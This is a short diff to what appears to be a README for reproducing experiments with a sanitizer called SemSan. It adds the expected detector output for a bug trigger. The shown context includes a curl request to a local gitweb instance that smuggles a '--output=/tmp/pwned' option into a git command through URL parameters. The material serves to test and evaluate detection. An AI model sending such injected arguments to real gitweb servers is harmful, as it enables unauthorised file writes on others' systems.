@@ -75,6 +75,11 @@ Request the following URL with cURL or a web browser to trigger the bug:
 curl 'http://127.0.0.1:1234/?p=.git;a=blobdiff;f=*;hpb=--output=/tmp/pwned;hb=HEAD'
 ```
 
+**Expected output:** In the SemSan output in the multiplexer, you should see:
+`[gitweb.cgi:2994615] Canary triggered: detected disallowed substring "pwned" in arg 1 of syscall execve`
+
+###
+
 ## RQ2: Detection Accuracy (Sec 7.2)
 
 This experiment stresses the capability of SemSan to detect existing bugs. For
